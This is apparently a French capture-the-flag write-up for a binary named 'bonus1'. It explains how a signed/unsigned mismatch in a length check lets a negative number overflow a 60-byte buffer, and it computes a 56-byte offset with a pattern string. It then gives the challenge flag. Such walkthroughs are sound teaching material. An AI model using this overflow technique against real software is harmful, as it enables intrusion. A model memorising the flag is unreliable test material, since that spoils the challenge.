1. Le programme demande un nombre n et un autre paramètre dont n caractères seront copies dans un buffer de 60 bytes.
2. Mais le programme vérifie si `(int)n < 9`, et copie `(size_t)n` bytes. On peut donc utiliser un nombre négatif afin de copier plus de 60 bytes.
   ```
   0xffffffff (uint)(=4294967295) (int)(and = -1)
   0xffffffff / 4 = 0x3fffffff = 1073741823
   ```
3. On trouve l'offset
   ```
   (0xffffffff - 200) / 4 = 0x3fffffcd = 1073741773

   ./bonus1 -1073741773 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
   ```
   => offset de 56
4. On écrit donc l'exploit

> Flag: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245